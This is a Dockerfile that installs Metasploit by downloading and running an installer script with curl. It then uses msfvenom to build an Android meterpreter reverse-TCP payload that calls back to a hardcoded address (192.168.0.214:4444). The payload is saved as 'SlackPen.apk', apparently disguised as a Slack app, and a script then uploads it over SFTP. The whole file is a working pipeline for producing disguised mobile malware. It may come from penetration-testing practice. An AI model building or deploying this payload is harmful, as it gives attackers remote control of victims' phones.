FROM python:3.7
FROM siutin/ubuntu-rvm

WORKDIR /usr/src/wdir
ADD . /usr/src/wdir

ENV DEBIAN_FRONTEND=noninteractive
RUN sudo apt-get update
RUN sudo ./tzdata_add.sh 

RUN sudo apt-get update && \
     sudo apt-get -y install apt-utils && \
      sudo apt-get -y install sudo && \
       sudo apt-get -y install wget && \
		sudo apt-get -y install openssl && \
		 sudo apt-get -y install curl && \
		  sudo apt-get -y install ssh

RUN sudo /bin/bash -l -c '/usr/src/wdir/install-apktool.sh'

RUN sudo /bin/bash -l -c 'sudo curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && sudo chmod 755 msfinstall && sudo ./msfinstall'

RUN sudo /bin/bash -l -c 'msfvenom -p android/meterpreter/reverse_tcp LHOST="192.168.0.214" LPORT=4444 R > SlackPen.apk'

RUN sudo apt-get -y install python3-distutils
RUN sudo python3 get-pip.py
RUN sudo python3 -m pip install pysftp

RUN sudo /bin/bash -l -c 'sudo python3 /usr/src/wdir/get_file_sftp.py'

RUN ls -la
